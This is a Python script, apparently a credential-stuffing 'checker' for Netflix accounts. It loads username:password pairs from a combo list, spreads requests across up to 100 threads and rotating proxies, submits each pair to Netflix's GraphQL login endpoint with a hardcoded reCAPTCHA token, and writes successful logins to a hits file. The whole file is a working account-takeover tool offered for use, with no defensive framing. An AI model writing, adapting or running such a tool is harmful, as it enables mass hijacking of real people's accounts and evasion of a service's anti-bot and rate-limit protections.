import httpx
import json
import random
import threading
import asyncio
import os
import sys
from colorama import Fore, init
import queue
import datetime


init(autoreset=True)


checked = 0
hits = 0
LOCK = threading.Lock()
PROXIES = []
COMBOS = queue.Queue()

hits_filename = os.path.join("hits",datetime.datetime.now().strftime("%D-%m-%Y %H:%M:%S") + ".txt")



def netflix_thread(PROXIES, COMBOS: queue.Queue,verbose):
    global checked, hits
    while True:
        try:
            combo = COMBOS.get_nowait()
        except queue.Empty:
            return
        try:
            username, password = combo.split(":", 1)
        except Exception:
            with LOCK:
                print(Fore.RED + f"[FAIL] {combo} | bad combo format")
                checked += 1
            continue

        proxy_url = None
        if PROXIES:
            proxy_url = build_proxy_url(random.choice(PROXIES))
        headers = {"Accept": "application/json"}
        with httpx.Client(
            proxy=proxy_url, timeout=30, verify=False, headers=headers
        ) as client:

            res = client.get(
                "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location"
            )

            country_iso_code = safe_json(res).get("country")

            res = client.get(f"https://restcountries.com/v3.1/alpha/{country_iso_code}")
            country_data = safe_json(res)
            if country_data and len(country_data) > 0:
                idd = country_data[0].get("idd")
                country_code = idd.get("root") + idd.get("suffixes")[0]
            else:
                country_code = "US"

            payload = {
                "operationName": "CLCSScreenUpdate",
                "variables": {
                    "format": "HTML",
                    "imageFormat": "PNG",
                    "locale": f"en-{country_iso_code}",
                    "serverState": '{"realm":"growth","name":"LOGIN","clcsSessionId":"603d0ad3-3efb-4b43-aba3-1451ce8af7a7","sessionContext":{"session-breadcrumbs":{"funnel_name":"loginWeb"}}}',
                    "serverScreenUpdate": '{"realm":"custom","name":"login.with.userLoginId.and.password","metadata":{"recaptchaSiteKey":"6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"},"loggingAction":"Submitted","loggingCommand":"SubmitCommand","referrerRenditionId":"69c7d5b5-bc42-4425-b451-00b8399f1fe4"}',
                    "inputFields": [
                        {
                            "name": "userLoginId",
                            "value": {"stringValue": username},
                        },
                        {"name": "password", "value": {"stringValue": password}},
                        {"name": "countryCode", "value": {"stringValue": country_code}},
                        {
                            "name": "countryIsoCode",
                            "value": {"stringValue": country_iso_code},
                        },
                        {"name": "recaptchaResponseTime", "value": {"intValue": 323}},
                        {
                            "name": "recaptchaResponseToken",
                            "value": {
                                "stringValue": "0cAFcWeA7PTXe-Pxp3MuZn0EPvOYzJkRFicvQnnDv65kqIslXdXHORlepKkvQuEJxofjtNPzvuFaK0IkEPtAtvw4YXrfvQk6tS6WWx7MhJs3a8Z18Z4mvM9_qmZzvoXfm9ZCEw108VAU_Ra06h7ZdvO0ATAKWezGuN-zcvIYqj_6pg2HTvarKgTMTo6Pq4eGvvUF2EHzLBAmvhJqZJwVC0rCORbQxczHRB8V0ymU7HuDaQOFPxlUsLMNzfWB-wNe4E5vhzNTU6L78nlYrapy9ke-VPLONew0zekxwznbQZq7jUHKTFJRJUC0mXGst2E_cmZ2T5AO6wEsTLe7Oqfkm0ImtssCR1xoEE7TfwZRcsKRMy9G1A40mbeMk3c5mifiVXuLV9DSRUrYOHPIQaEfK2Lv8hJAo4mQyKbka-BrJcPUeO6D5hYjT3mhB5g0_y1Ih_eMxZovlwEbLxSEqGFeTH3tIQ323VrJktv4U8t27rAUn49tGLLcVVNlWMo271KqHRWD1QJZ3ALLBLMDc6NKdOEgFB6FkgqUfL7_DPfQV6Su5z5BqZtPhEtdT6e4zoPd3t9GUR_nXtdblZYZMTC2Y-PkcHSqigpn5iVDSsrbRHG05TfzaBxS0j5Vv_GphfNQj_bwiXQZ_2PSsNvfZ5ogZUPXoW6C7moh6IJsig3vAnkatBQVIWy6xcsQZ2AnocEaxQxf5JZhr-8HQbtdYtKganrRFRpVSUKWNzooPtgfU7b8kjnFrHSTteeCnNR5RxK9WAqvjZ6Ov2lqdo7VrU0wfD2cLHkRPsoLlTpz9Q9Ls6Cs2xAHI5rI87hDWghIFVrGa4ylRcghmS3aB_GiGb44fD2R8zpvs_F9eZ_G2txgeKer5LQoImKaUx0tIjpsNSGEsBlKHY6xbw-MqeToKyI6P8w4pf2jI-wJXDuEyLI_CalGvdwAyFfEvIWvaGVln2GS2QssIUEUtveNrYFQlzK-JzVjQ6oDpcMoq3DgY76jcmB3pBUKdrR1x-1t9eg1nimgG7Z9mY7zrFdIUo3v4Psk-5u09aCGMwSCV89n6oQA07d7qAY2EJsODOvZf5Gd12EZZ_kJJXJACRbGKTZfE4JGpuqmW3ditsWhB3M2Af0umrbZfhgh7cQ_SA-NXUsVLpGTnHwBDeJhBlCJSbR42X_ClGKCJHanqWpAR0sRvgZNvB8X0Um-S01gHMEOt3rJuc2fdIw7NSHVE_o0IUT8TLnGxR-JLOY30xgmTuR5r9LuBZV_TgVLW19ZuHoYxBCt3vJnwGR0tcp_WwVQQDPRNDgizS9smxglu3zo1ZqikYv4qzDaTOeFYDCtR1pGePMFvjthy8BHN9MYnCbPk3PWR7SROJ1u_aRWA1d28Z_bTn0qdIVJOmRMFg-aohTjAw7qomonVoPH0eni2RwgRyqPJweri-k_RehdlvNiH7SLqQ9Swr6lzb9dhnqIhWzk0g6DdRpxnAUtEKgGL2vn18440vL4P7rLGl8H8LpMnwknQK-gaM-rvGHq1lbnRSOVWqFxs6Kkaa7EXb7tiM2jOc4HnUQkowXNvXPZ5vrpFgiPi_J6E2U-wofkGPk-V3NVAJrNm8rzNkYNYm5OH545XGSNQPFLl5iHH5WPauMpz_9UZ0sUl22MNyic_hAmzp4FTo17JCPy8wyb79AuDg6n5_l5SapkQfLWyiLFO8iTfBOEXKgyzVhb6gMa9nmTJY9UIwEWUcBqsR9Jb2UYvQKZQ5NDbTZOWrcgO8L_mjdvy9MQEuXqo9g-zWCF76APduL7NNldsvPlMofepilIC-uB5K3SrbBO_ENf4FSYeg5d1Lhg8OwY70mzdSHitOLejfPhq_ss_5CNtiL1KFb9oj1ix4p0QZXWiEwKJAQ8_SivT3_W4RYgRnvIXzoTalRvL1uF-AlXyc0XtnlA4qZDZ0yIlQwlYXE6XG0U0f6AtXk0i11e0ESBTC-tc3ERQH0hg_keC97ue_2yp0CFjS7GQb0MV7CK-4TjGuFcg8FsksxXalUnpDRm5gzQlo8GiW7Y-rey4-0zM2DThEtJR8ke8SbjbPEBSSknBkXEtfSZvUI637hjKb74YeI3FyDlClqeE0qP5qZ08YG04PfAOAl-MM4zAMAXYnopcyhiSTvb4xPY5C79hBglzsv9m97L04XVE0H4k"
                            },
                        },
                    ],
                },
                "extensions": {
                    "persistedQuery": {
                        "id": "75fbc994-0c3b-462c-8558-f73fd869e5b9",
                        "version": 102,
                    }
                },
            }
            headers = {"Content-Type": "application/json", "Accept": "application/json"}

            try:
                result = httpx.post(
                    "https://web.prod.cloud.netflix.com/graphql",
                    headers=headers,
                    json=payload,
                )
                raw = safe_json(result)
                all_text = str(raw)
            
                
                if (("Incorrect password " not in all_text) and ("alert-message-header" not in all_text) and ("sign in" not in all_text)):
                    print(Fore.GREEN+"[+] login successful !")
                    if (verbose):
                        print(Fore.GREEN + f"[+] login successful with {combo}  !")
                    save_hit(username,password)
                    with LOCK:
                        checked += 1
                        hits += 1
                elif (verbose):
                    print(Fore.RED + f"[!] login failed with {combo}  !")
                else:
                    with LOCK:
                        checked += 1
            except httpx.RequestError:
                with LOCK:
                    print(Fore.RED + f"[FAIL] {combo} [retrying...]")
                continue

def save_hit(username,password):
    with open(hits_filename,"a",encoding="utf-8") as f:
        f.write(f"{username}:{password}\n")


def safe_json(res):
    try:
        return res.json()
    except Exception:
        return None


def build_proxy_url(line: str):
    """
    Normalize common proxy formats to a URL usable by httpx.
    Examples accepted:
      - ip:port
      - ip:port:user:pass
      - user:pass@ip:port
      - http://..., https://..., socks5://...
    Returns a string or None if it can't normalize.
    """
    if not line:
        return None
    line = line.strip()
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    if "@" in line and ":" in line:
        return "http://" + line if not line.startswith("http") else line
    parts = line.split(":")
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    return None


async def main():
    global PROXIES, COMBOS
    print(
        r"""
    _        _______ _________ _______           _______  _______  _        _______  _______ 
    ( (    /|(  ____ \\__   __/(  ____ \|\     /|(  ____ \(  ____ \| \    /\(  ____ \(  ____ )
    |  \  ( || (    \/   ) (   | (    \/| )   ( || (    \/| (    \/|  \  / /| (    \/| (    )|
    |   \ | || (__       | |   | |      | (___) || (__    | |      |  (_/ / | (__    | (____)|
    | (\ \) ||  __)      | |   | |      |  ___  ||  __)   | |      |   _ (  |  __)   |     __)
    | | \   || (         | |   | |      | (   ) || (      | |      |  ( \ \ | (      | (\ (   
    | )  \  || (____/\   | |   | (____/\| )   ( || (____/\| (____/\|  /  \ \| (____/\| ) \ \__
    |/    )_)(_______/   )_(   (_______/|/     \|(_______/(_______/|_/    \/(_______/|/   \__/
                                                                            
        Netflix [1]         (comming soon...) by ahmed mbarek


"""
    )

    if not os.path.isfile("combos.txt"):
        print(
            Fore.RED
            + f"[!] Missing combos.txt in current folder. Create it and add combos username:password per line."
        )
        sys.exit(0)

    CHECKER_TYPE = input("> ")

    while CHECKER_TYPE not in ["1"]:
        print(Fore.YELLOW + "[!] command is not found !")
        CHECKER_TYPE = input("> ")
    CHECKER_TYPE = int(CHECKER_TYPE)


    use_proxies = input("[*] Use proxies? (Y/N): ").strip().upper() == "Y"

    if use_proxies:
        if os.path.isfile("proxies.txt"):
            with open("proxies.txt", "r", encoding="utf-8") as f:
                PROXIES = [line.strip() for line in f if line.strip()]
        else:
            print(Fore.RED + "[!] no proxies available, try adding proxies in proxies.txt")
            print(Fore.RED + "or you can continue without a proxy so using your (IP/VPN):")
            if input("[*] continue (Y/N): ").strip().upper() != "Y":
                sys.exit(1)

    if not PROXIES:
        print(Fore.YELLOW + "[+] Proxyless mode enabled (using your IP/VPN).")
    
    try:
        THREADS_COUNT = int(input("threads [default:100]: ") or 100)
    except:
        THREADS_COUNT = 100
    verbose = input("you want to use verbose mode (Y/N) : ").strip().upper() == "Y"
    
    with open("combos.txt", "r", encoding="utf-8") as f:
        for line in f:
            if line.strip():
                COMBOS.put(line.strip())
    
    combos_size = COMBOS.qsize()

    threads = []
    match (CHECKER_TYPE):
        case 1:
            for _ in range(THREADS_COUNT):
                t = threading.Thread(
                    target=netflix_thread,
                    args=(
                        PROXIES,
                        COMBOS,
                        verbose
                    ),
                )
                threads.append(t)
                t.start()
            for t in threads:
                t.join()
            del threads

    print(Fore.CYAN + f"Done!,  Checked {checked}/{combos_size} | Hits={hits}")


if __name__ == "__main__":
    asyncio.run(main())